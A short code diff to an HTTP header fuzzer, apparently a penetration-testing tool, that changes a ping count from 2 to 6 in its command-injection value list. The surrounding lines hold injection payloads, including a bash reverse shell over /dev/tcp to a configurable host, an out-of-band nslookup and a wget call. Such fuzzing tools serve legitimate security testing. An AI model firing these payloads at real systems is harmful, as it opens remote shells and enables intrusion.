@@ -2,7 +2,6 @@
 values used by http_header_fuzzer.py.
 '''
 
-
 import string
 import random
 from config import *
@@ -225,7 +224,7 @@ def command_injection_values():
     port = PORT if PORT else '80'
     domain = DOMAIN_NAME if DOMAIN_NAME else 'laconicwolf.com'
     random_string = get_random_string(8)
-    values = [';ping ' + ip + ' -c 2',
+    values = [';ping ' + ip + ' -c 6',
               ';/bin/bash -i > /dev/tcp/' + ip + '/' + port + '0<&1 2>&1',
               ';nslookup ' + random_string + '.' + domain,
               ';wget http://' + ip]
